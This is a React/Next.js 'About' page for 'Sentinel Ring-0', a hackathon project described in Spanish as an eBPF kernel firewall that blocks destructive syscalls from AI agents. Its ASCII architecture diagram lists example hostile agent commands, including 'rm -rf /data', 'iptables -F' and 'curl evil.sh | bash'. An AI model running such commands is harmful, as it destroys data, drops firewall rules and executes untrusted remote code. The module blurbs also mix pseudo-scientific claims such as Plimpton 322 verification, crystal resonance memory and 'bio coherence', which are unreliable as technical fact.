"use client";

import React, { useState, useEffect } from "react";
import Link from "next/link";
import {
  Shield,
  Cpu,
  Zap,
  GitBranch,
  Hexagon,
  Brain,
  Network,
  Lock,
  ExternalLink,
  Activity,
  BookOpen,
  ChevronRight,
  Terminal,
  Hash,
} from "lucide-react";

const FEATURED_DOCS = [
  {
    path: "README.md",
    title: "Visión General del Proyecto",
    desc: "Qué es Sentinel Ring-0, el problema que resuelve, arquitectura y cómo probarlo.",
    color: "emerald",
    icon: Shield,
  },
  {
    path: "DOCUMENTACION_TECNICA.md",
    title: "Documentación Técnica Completa",
    desc: "Todos los módulos, matemática S60, eBPF, TruthSync, API reference y métricas.",
    color: "sky",
    icon: Terminal,
  },
  {
    path: "CRYSTAL_LATTICE.md",
    title: "Crystal Lattice Matrix",
    desc: "Física del oscilador piezoeléctrico, Plimpton 322, visualización heatmap y cifrado dinámico.",
    color: "violet",
    icon: Hexagon,
  },
];

const MODULES = [
  {
    icon: GitBranch,
    color: "text-rose-400",
    bg: "bg-rose-500/10",
    border: "border-rose-500/20",
    name: "eBPF Ring-0",
    desc: "Hooks LSM en execve/file_open + XDP a velocidad de línea. Intercepta antes de que el proceso tenga privilegios.",
    badge: "< 0.04 ms",
  },
  {
    icon: Hash,
    color: "text-amber-400",
    bg: "bg-amber-500/10",
    border: "border-amber-500/20",
    name: "Aritmética S60",
    desc: "Base-60 en i64 puro, sin floats. SCALE_0 = 60⁴ = 12.960.000. Precisión ±0.0077 ppm, determinismo total.",
    badge: "±0.0077 ppm",
  },
  {
    icon: Hexagon,
    color: "text-violet-400",
    bg: "bg-violet-500/10",
    border: "border-violet-500/20",
    name: "Crystal Lattice",
    desc: "Red de 1024 osciladores piezoeléctricos en S60. Frecuencia derivada de la tablilla babilónica Plimpton 322.",
    badge: "1024 nodos",
  },
  {
    icon: Brain,
    color: "text-sky-400",
    bg: "bg-sky-500/10",
    border: "border-sky-500/20",
    name: "Neural LIF S60",
    desc: "Neuronas Leaky Integrate-and-Fire en S60 puro. La tasa de disparo condiciona el cifrado dinámico de cada tick.",
    badge: "0 floats",
  },
  {
    icon: Lock,
    color: "text-emerald-400",
    bg: "bg-emerald-500/10",
    border: "border-emerald-500/20",
    name: "TruthSync",
    desc: "Verificación matemática de integridad via Plimpton 322. Detecta payloads AIOpsDoom y activa cuarentena automática.",
    badge: "Plimpton 322",
  },
  {
    icon: Network,
    color: "text-teal-400",
    bg: "bg-teal-500/10",
    border: "border-teal-500/20",
    name: "MyCNet P2P",
    desc: "Red mesh sincronizada en ritmo YHWH (10-5-6-5 ticks). Protocolo de sincronía entre nodos distribuidos.",
    badge: "41.77 Hz",
  },
];

const colorMap: Record<string, { text: string; bg: string; border: string; glow: string }> = {
  emerald: { text: "text-emerald-400", bg: "bg-emerald-500/10", border: "border-emerald-500/30", glow: "shadow-emerald-500/10" },
  sky:     { text: "text-sky-400",     bg: "bg-sky-500/10",     border: "border-sky-500/30",     glow: "shadow-sky-500/10"     },
  violet:  { text: "text-violet-400",  bg: "bg-violet-500/10",  border: "border-violet-500/30",  glow: "shadow-violet-500/10"  },
};

export function AboutView() {
  const [status, setStatus] = useState<any>(null);
  const [tick, setTick] = useState<number>(0);

  useEffect(() => {
    const apiBase = process.env.NEXT_PUBLIC_API_URL || "";
    const fetch_ = () =>
      fetch(`${apiBase}/api/v1/sentinel_status`)
        .then((r) => r.json())
        .then(setStatus)
        .catch(() => {});
    fetch_();
    const iv = setInterval(fetch_, 5000);
    return () => clearInterval(iv);
  }, []);

  useEffect(() => {
    const apiBase = process.env.NEXT_PUBLIC_API_URL || "";
    const fetch_ = () =>
      fetch(`${apiBase}/api/v1/lattice/state`)
        .then((r) => r.json())
        .then((d) => setTick(d.global_tick))
        .catch(() => {});
    fetch_();
    const iv = setInterval(fetch_, 3000);
    return () => clearInterval(iv);
  }, []);

  const bioCoherencePct = status
    ? Math.min(100, (Math.abs(status.bio_coherence) / 12_960_000) * 100).toFixed(1)
    : "0.0";

  return (
    <div className="space-y-8 animate-in fade-in slide-in-from-right-4 duration-500 pb-10">

      {/* ── HERO ── */}
      <div className="glass-card p-8 border-emerald-500/10 bg-gradient-to-br from-slate-950/80 to-emerald-950/10 relative overflow-hidden">
        <div className="absolute inset-0 bg-[radial-gradient(ellipse_at_top_right,rgba(16,185,129,0.08),transparent_60%)] pointer-events-none" />
        <div className="relative z-10 flex flex-col md:flex-row md:items-center gap-6">
          <div className="p-4 bg-emerald-500/10 rounded-3xl border border-emerald-500/20 shadow-[0_0_40px_rgba(16,185,129,0.12)] shrink-0">
            <Shield className="w-12 h-12 text-emerald-400" />
          </div>
          <div className="flex-1 space-y-2">
            <div className="flex flex-wrap items-center gap-2">
              <h1 className="text-3xl font-black uppercase tracking-tighter text-white">
                Sentinel Ring-0
              </h1>
              <span className="px-2.5 py-0.5 bg-emerald-500/10 border border-emerald-500/30 rounded-full text-[9px] font-black text-emerald-400 uppercase tracking-widest">
                v1.0.0
              </span>
              <span className="px-2.5 py-0.5 bg-sky-500/10 border border-sky-500/30 rounded-full text-[9px] font-black text-sky-400 uppercase tracking-widest">
                Hackatón CubePath 2026
              </span>
            </div>
            <p className="text-slate-400 text-sm leading-relaxed max-w-2xl">
              Firewall cognitivo que opera en <span className="text-white font-bold">Ring-0 del kernel Linux</span> vía eBPF. Intercepta syscalls destructivas de agentes de IA{" "}
              <span className="text-emerald-400 font-bold">antes de que se ejecuten</span>, usando aritmética Base-60 sin floats y memoria de cristales resonantes.
            </p>
            <div className="flex flex-wrap gap-3 pt-1">
              <a
                href="https://vps23309.cubepath.net/"
                target="_blank"
                rel="noopener noreferrer"
                className="flex items-center gap-2 px-3 py-1.5 bg-emerald-500/10 border border-emerald-500/30 rounded-lg text-[10px] font-black text-emerald-400 uppercase tracking-widest hover:bg-emerald-500/20 transition-colors"
              >
                <div className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
                Demo en Vivo
                <ExternalLink className="w-3 h-3" />
              </a>
              <a
                href="https://github.com/jenovoas/sentinel_cubepath"
                target="_blank"
                rel="noopener noreferrer"
                className="flex items-center gap-2 px-3 py-1.5 bg-slate-800 border border-white/5 rounded-lg text-[10px] font-black text-slate-400 uppercase tracking-widest hover:text-white hover:border-white/10 transition-colors"
              >
                GitHub
                <ExternalLink className="w-3 h-3" />
              </a>
              <Link
                href="/docs"
                className="flex items-center gap-2 px-3 py-1.5 bg-slate-800 border border-white/5 rounded-lg text-[10px] font-black text-slate-400 uppercase tracking-widest hover:text-white hover:border-white/10 transition-colors"
              >
                <BookOpen className="w-3 h-3" />
                Documentación
              </Link>
            </div>
          </div>
          {/* Live pulse */}
          <div className="shrink-0 flex flex-col items-center gap-1 px-6 border-l border-white/5 hidden md:flex">
            <Activity className="w-5 h-5 text-emerald-400 animate-pulse" />
            <span className="text-[8px] font-black uppercase tracking-widest text-slate-600">Tick S60</span>
            <span className="text-2xl font-black mono text-white tabular-nums">{tick.toLocaleString("es-CL")}</span>
            <span className="text-[8px] text-slate-600 mono">41.77 Hz</span>
          </div>
        </div>
      </div>

      {/* ── MÉTRICAS LIVE ── */}
      <div>
        <h2 className="text-[10px] font-black uppercase tracking-[0.25em] text-slate-500 mb-3">
          Estado del sistema — en vivo
        </h2>
        <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
          {[
            { label: "Ring Status",     value: status?.ring_status    ?? "—", color: "text-emerald-400" },
            { label: "XDP Firewall",    value: status?.xdp_firewall   ?? "—", color: "text-rose-400"    },
            { label: "LSM Cognitive",   value: status?.lsm_cognitive  ?? "—", color: "text-sky-400"     },
            { label: "Bio Coherencia",  value: `${bioCoherencePct}%`,         color: "text-violet-400"  },
          ].map((s) => (
            <div key={s.label} className="glass-card p-4 space-y-1 border-white/5">
              <span className="text-[8px] font-black uppercase tracking-widest text-slate-600">{s.label}</span>
              <p className={`text-sm font-black mono ${s.color}`}>{s.value}</p>
            </div>
          ))}
        </div>
      </div>

      {/* ── MÓDULOS ── */}
      <div>
        <h2 className="text-[10px] font-black uppercase tracking-[0.25em] text-slate-500 mb-3">
          Módulos del sistema
        </h2>
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
          {MODULES.map((mod) => (
            <div
              key={mod.name}
              className={`glass-card p-5 border ${mod.border} ${mod.bg} space-y-3 hover:scale-[1.01] transition-transform`}
            >
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <div className={`p-2 ${mod.bg} rounded-xl border ${mod.border}`}>
                    <mod.icon className={`w-4 h-4 ${mod.color}`} />
                  </div>
                  <span className="text-sm font-black text-white">{mod.name}</span>
                </div>
                <span className={`text-[8px] font-black mono px-2 py-0.5 rounded border ${mod.border} ${mod.color} bg-black/20`}>
                  {mod.badge}
                </span>
              </div>
              <p className="text-[10px] text-slate-500 leading-relaxed">{mod.desc}</p>
            </div>
          ))}
        </div>
      </div>

      {/* ── ARQUITECTURA ASCII ── */}
      <div className="glass-card p-6 border-white/5 bg-slate-950/60">
        <h2 className="text-[10px] font-black uppercase tracking-[0.25em] text-slate-500 mb-4">
          Arquitectura del sistema
        </h2>
        <pre className="text-[9px] leading-relaxed text-slate-400 font-mono overflow-x-auto">{`
  AGENTE IA (GPT-4 / Claude / Gemini / Llama)
  Ejecuta: rm -rf /data  |  iptables -F  |  curl evil.sh | bash
           │
           │  syscall
           ▼
╔══════════════════════════════════════════════════╗
║  RING 0 — KERNEL eBPF                           ║
║  ┌──────────────┐  ┌─────────────┐  ┌─────────┐ ║
║  │lsm_guardian  │  │xdp_firewall │  │tc_kill  │ ║
║  │execve hook   │  │< 0.04 ms    │  │switch   │ ║
║  │file_open hook│  │line-rate    │  │quaranta │ ║
║  └──────┬───────┘  └─────────────┘  └─────────┘ ║
║         │ RingBuffer 256KB (zero-copy)            ║
╠═════════╪════════════════════════════════════════╣
║  RING 3 — RUST + AXUM + TOKIO                   ║
║         │                                        ║
║  ┌──────▼──────────────────────────────────────┐ ║
║  │  math/s60.rs  —  Base-60 i64, sin floats   │ ║
║  │  SCALE_0 = 60⁴ = 12.960.000               │ ║
║  └──────┬──────────────────────────────────────┘ ║
║         │                                        ║
║  crystal.rs   SovereignCrystal × 1024  (NUEVO)  ║
║  resonant.rs  ResonantMemory 1024 nodos (NUEVO)  ║
║  neural.rs    Neuronas LIF en S60 puro  (NUEVO)  ║
║  truthsync.rs Plimpton 322 verification         ║
║  quantum/     BioResonador + PortalDetector     ║
║  mycnet.rs    P2P mesh YHWH (10-5-6-5)          ║
╠══════════════════════════════════════════════════╣
║  FRONTEND — Next.js + React + TypeScript        ║
║  Dashboard  │ AIOps Shield  │ Crystal Matrix    ║
║  MyCNet     │ Audit Vault   │ Docs Vault        ║
╚══════════════════════════════════════════════════╝
        `}</pre>
      </div>

      {/* ── DOCS CLAVE ── */}
      <div>
        <div className="flex items-center justify-between mb-3">
          <h2 className="text-[10px] font-black uppercase tracking-[0.25em] text-slate-500">
            Documentación clave
          </h2>
          <Link
            href="/docs"
            className="flex items-center gap-1 text-[9px] font-black uppercase tracking-widest text-slate-600 hover:text-emerald-400 transition-colors"
          >
            Ver archivo completo (163 docs)
            <ChevronRight className="w-3 h-3" />
          </Link>
        </div>
        <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
          {FEATURED_DOCS.map((doc) => {
            const c = colorMap[doc.color];
            return (
              <Link key={doc.path} href={`/docs/${doc.path}`}>
                <div
                  className={`glass-card p-5 border ${c.border} ${c.bg} shadow-lg ${c.glow} space-y-3 hover:scale-[1.02] transition-all duration-200 cursor-pointer h-full`}
                >
                  <div className="flex items-center gap-3">
                    <div className={`p-2 ${c.bg} rounded-xl border ${c.border}`}>
                      <doc.icon className={`w-4 h-4 ${c.text}`} />
                    </div>
                    <span className={`text-[9px] font-black mono uppercase tracking-widest ${c.text}`}>
                      {doc.path}
                    </span>
                  </div>
                  <h3 className="text-sm font-black text-white leading-tight">{doc.title}</h3>
                  <p className="text-[10px] text-slate-500 leading-relaxed">{doc.desc}</p>
                  <div className={`flex items-center gap-1 text-[9px] font-black ${c.text} mt-auto`}>
                    Leer documento <ChevronRight className="w-3 h-3" />
                  </div>
                </div>
              </Link>
            );
          })}
        </div>
      </div>

      {/* ── HACKATHON INFO ── */}
      <div className="glass-card p-6 border-sky-500/10 bg-slate-950/40 flex flex-col md:flex-row gap-6 items-start md:items-center">
        <div className="flex-1 space-y-1">
          <span className="text-[8px] font-black uppercase tracking-[0.3em] text-sky-500">Hackatón CubePath 2026 · MiduDev</span>
          <h3 className="text-lg font-black text-white">Desarrollado por Jaime Novoa</h3>
          <p className="text-[10px] text-slate-500">
            Deadline: <span className="text-white font-bold">31 de marzo de 2026, 23:59 CET</span> ·
            Criterios: UX → Creatividad → Utilidad → Implementación técnica
          </p>
        </div>
        <div className="grid grid-cols-3 gap-3 shrink-0">
          {[
            { v: "< 0.04 ms", l: "Latencia XDP"   },
            { v: "62.9%",     l: "Ahorro CPU"      },
            { v: "94.4%",     l: "Eficiencia Sched"},
          ].map((m) => (
            <div key={m.l} className="text-center">
              <p className="text-lg font-black text-sky-400 mono">{m.v}</p>
              <p className="text-[8px] text-slate-600 uppercase tracking-wider">{m.l}</p>
            </div>
          ))}
        </div>
      </div>

    </div>
  );
}
